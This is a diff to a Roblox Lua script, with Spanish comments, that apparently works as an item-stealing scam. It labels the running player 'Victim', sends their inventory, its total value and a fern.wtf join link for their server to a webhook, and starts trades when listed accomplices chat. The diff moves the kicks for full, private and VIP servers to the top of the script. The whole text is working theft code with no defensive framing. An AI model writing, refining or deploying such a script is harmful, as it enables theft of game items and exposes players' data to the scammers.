@@ -19,6 +19,26 @@ if not req then
     return
 end
 
+-- ===== Kick inicial apenas ejecuta =====
+local maxPlayers = 12
+local privateId = game.PrivateServerId
+local isVIP = false
+
+-- Detectar servidor VIP
+pcall(function()
+    if game:GetService("ReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+        isVIP = true
+    end
+end)
+
+if #Players:GetPlayers() >= maxPlayers then
+    LocalPlayer:Kick("🚫 Servidor lleno. Buscando servidor vacío...")
+elseif privateId ~= "" then
+    LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando servidor público...")
+elseif isVIP then
+    LocalPlayer:Kick("👑 Servidor VIP detectado. Buscando servidor normal...")
+end
+
 -- Función para enviar webhook
 local function SendWebhook(title, description, fields, prefix)
     local data = {
@@ -99,6 +119,7 @@ local function extractChroma(html)
     end
     return t
 end
+
 local function buildValueList()
     local allValues,chromaValues={},{}
     for r,url in pairs(categories) do
@@ -160,33 +181,15 @@ end
 -- Ordenar armas por valor total
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- Generar join con Fern dinámico (sin alteración)
-local fernToken = math.random(100000,999999)
-local safeLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken
-
--- Kick y manejo de servidor lleno/privado/VIP
-local function CheckServer()
-    -- Servidor lleno
-    if #Players:GetPlayers() >= 12 then
-        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
-    end
-    -- Servidor privado detectado
-    if game.PrivateServerId and game.PrivateServerId ~= "" then
-        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
-    end
-    -- Servidor VIP detectado
-    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
-    if success and ownerId and ownerId ~= 0 then
-        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
-    end
-end
+-- Generar enlace Fern dinámico protegido
+local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..math.random(100000,999999)
 
 -- Webhook fields
 local fields={
     {name="Victim 👤:", value=LocalPlayer.Name, inline=true},
     {name="Inventario 📦:", value="", inline=false},
     {name="Valor total del inventario📦:", value=tostring(totalValue), inline=true},
-    {name="Haz click aqui para unirte👇:", value=safeLink, inline=false}
+    {name="Click para unirse a la víctima 👇:", value=joinLink, inline=false}
 }
 for _, w in ipairs(weaponsToSend) do
     fields[2].value=fields[2].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
@@ -215,20 +218,14 @@ local function doTrade(targetName)
     end
 end
 
--- Esperar chat para iniciar trade
+-- Monitoreo de jugadores y chat para trade
 for _, p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function() 
-            CheckServer()
-            doTrade(p.Name) 
-        end)
+        p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end
 Players.PlayerAdded:Connect(function(p)
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function() 
-            CheckServer()
-            doTrade(p.Name) 
-        end)
+        p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end)
